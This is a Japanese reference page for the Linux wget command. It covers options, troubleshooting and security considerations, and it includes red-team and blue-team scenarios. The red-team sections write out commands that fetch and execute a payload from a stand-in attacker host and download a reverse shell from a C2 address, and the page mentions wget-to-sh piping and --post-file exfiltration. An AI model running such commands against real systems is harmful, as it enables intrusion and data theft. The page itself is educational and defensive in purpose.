# Command  - Linux - wget - 非対話的なネットワークダウンローダー

## 概要

`wget` (World Wide Web get) は、HTTP, HTTPS, FTPプロトコルを使って、Webサーバーからファイルやコンテンツを**非対話的**にダウンロードするためのコマンドラインツールです。コマンドを実行すれば、ユーザーがログアウトしてもバックグラウンドでダウンロードを継続できる堅牢性を持ちます。ファイルのダウンロードだけでなく、Webサイトを再帰的にダウンロードしてオフラインミラーを作成することも得意とします。

(出自: `wget` パッケージに含まれる)

## 類似コマンドと差異

| 類似コマンド | 差異 / 使い分けのポイント | 推奨 |
| :--- | :--- |:---|
| ⭐ **`curl`** | `wget` はファイルのダウンロードに特化した「ダウンローダー」です。`curl` は、APIとの対話（POST, PUTなど）やヘッダー操作など、より汎用的なデータ転送ツールです。 | `wget` (ダウンロード) / `curl` (API対話) |
| **`scp` / `sftp`** | SSHプロトコル上で**安全に**ファイルを転送します。`wget` は主にHTTP/HTTPS/FTPを扱います。 | - |

## よく連携されるコマンド

`wget` は、ダウンロードしたファイルに対して操作を行うため、`tar` や `bash` などのコマンドと連携して使われます。

### シナリオ例: ペイロードのダウンロードと実行 (レッドチーム視点)

* **目的**: 侵入したサーバー上で、外部から攻撃用のスクリプトをダウンロードし、実行する。
* **連携コマンド**: `chmod`, `bash`
* **解説**: `wget` でペイロードをダウンロードし、`chmod +x` で実行権限を付与、そして実行するという一連の流れは、攻撃の初期段階で頻繁に用いられます。
* **コマンド例**:

    ```bash
    # このコマンドシーケンスでペイロードをダウンロード・実行する
    # 1. /tmpディレクトリに移動
    cd /tmp

    # 2. 攻撃者のサーバーからスクリプトをダウンロード
    wget [http://attacker.com/payload.sh](http://attacker.com/payload.sh)

    # 3. 実行権限を付与
    chmod +x payload.sh

    # 4. スクリプトを実行
    ./payload.sh
    ```

## オプション説明

| オプション | 説明 |
| :--- | :--- |
| **基本操作** | |
| ⭐ `-O <file>` | (大文字のO) 出力を標準出力ではなく、指定したファイル名で保存します。 |
| ⭐ `-P <prefix>`| (大文字のP) ダウンロードしたファイルを、指定したディレクトリ配下に保存します。 |
| ⭐ `-c`, `--continue` | 中断されたダウンロードを再開します。 |
| `-b`, `--background` | 実行後、すぐにバックグラウンドに移行します。 |
| `-q`, `--quiet` | 実行中のメッセージを抑制し、静かに出力します。 |
| **再帰ダウンロード** | |
| `-r`, `--recursive`| Webサイトを再帰的にダウンロードします。 |
| `-l <depth>`| (`-r`と併用) 再帰的にたどる階層の深さを指定します。 |
| `-k`, `--convert-links`| ダウンロード後、HTML内のリンクをローカルで閲覧できるように変換します。 |
| **接続・認証** | |
| ⭐ `--no-check-certificate`| (危険) SSL/TLS証明書の検証をスキップします。 |
| `--user=<user>`, `--password=<pass>`| Basic認証などのユーザー名とパスワードを指定します。 |

## よく使われるオプション組み合わせと業務シナリオ

### 1. インフラ構築・運用視点

* **タスク**: ソフトウェアのパッケージやソースコードのアーカイブをダウンロードする。
* **組み合わせ**: `wget <URL> -P /path/to/dir`
* **解説**: `-P` オプションで保存先のディレクトリを指定する、最も基本的な使い方です。`-c` を付けておくと、巨大なファイルのダウンロードが途中で中断されても再開できます。
* **例**:

    ```bash
    # Nginxのソースコードをダウンロードし、/usr/local/src/ ディレクトリに保存
    wget [http://nginx.org/download/nginx-1.26.0.tar.gz](http://nginx.org/download/nginx-1.26.0.tar.gz) -P /usr/local/src/
    ```

### 2. ブルーチーム視点

* **タスク**: マルウェアサンプルを安全な環境で収集する。
* **組み合わせ**: `wget --no-check-certificate <malicious_url>`
* **解説**: 脅威インテリジェンスで得られたマルウェアの配布URLから検体をダウンロードします。攻撃者のサーバーは自己署名証明書などを使っていることが多いため、`--no-check-certificate` が必要になる場合があります。**この操作は必ず隔離された安全な環境で行う必要があります**。
* **例**:

    ```bash
    # サンドボックス環境でマルウェア検体を収集
    wget --no-check-certificate [https://evil-site.com/malware.exe](https://evil-site.com/malware.exe) -O sample1.exe
    ```

### 3. レッドチーム視点

* **タスク**: **ペイロードの持ち込み**。侵入したサーバーに攻撃用のスクリプトやバイナリをダウンロードする。
* **組み合わせ**: `wget <attacker_server>/payload -O /tmp/payload`
* **解説**: 攻撃者はシステム侵入後、まず `which wget` や `which curl` を実行し、外部と通信できるコマンドを探します。`wget` が存在すれば、それを使ってリバースシェルなどを `/tmp` や `/dev/shm` にダウンロードし、次の攻撃の準備を整えます。
* **例**:

    ```bash
    # C2サーバーからリバースシェルバイナリをダウンロード
    wget [http://10.0.0.5/revshell](http://10.0.0.5/revshell) -O /tmp/revshell
    ```

## エラーメッセージとトラブルシューティング

* 一般的なエラーは [Linux共通のトラブルシューティング](./troubleshooting_common_errors.md) を参照。

1. **エラーメッセージ例 1**: `ERROR 404: Not Found.`
    * **考えられる原因**: 指定したURLのパスが間違っているか、そのファイルはサーバー上に存在しません。
    * **解決策**: URLをブラウザで開いてみて、正しいパスを確認してください。

2. **エラーメッセージ例 2**: `ERROR: The certificate of ‘...’ is not trusted.`
    * **考えられる原因**: 接続先のHTTPSサーバーが使用しているSSL/TLS証明書が、システムの信頼する認証局 (CA) によって署名されていません。
    * **解決策**: 接続先が信頼できることが確実な場合に限り、`--no-check-certificate` オプションを付けて証明書の検証をスキップします。

## セキュリティに関する考慮事項

### 脆弱性と悪用事例

* **脆弱性**: `wget` 自体ではなく、**ダウンロードするファイル**がリスクとなります。
* **悪用シナリオ**: 信頼できないソースからダウンロードしたファイルには、マルウェアが含まれている可能性があります。また、`wget` でダウンロードしたスクリプトを直接シェルに渡す (`wget -O - ... | sh`) のは、`curl | bash` と同様に極めて危険です。

### GTFOBins / LOLBAS における利用例

* **機能**: **File Download**, **File Upload**, **Data Exfiltration**
* **解説**: `wget` は、環境寄生型バイナリ (LOLBAS) の代表格です。攻撃者は、ペイロードのダウンロードや、`--post-file` オプションを使ったデータのアップロード（窃取）に利用します。
* **参照**: `https://gtfobins.github.io/gtfobins/wget/`

### 対応策・緩和策 (ブルーチーム視点)

* **Prevention (予防)**: Egress（外部への送信）トラフィックをファイアウォールで厳格に制御し、不要なアウトバウンド通信を許可しない。
* **Detection (検知)**: `auditd` やEDRを使って、`wget` プロセスからの不審なURLへの接続や、ダウンロード後のファイルへの実行権限付与といった一連の振る舞いを監視する。

## 注意点・補足

* **非対話性**: `wget` は非対話的に動作するため、スクリプトやcronジョブに組み込むのに非常に適しています。
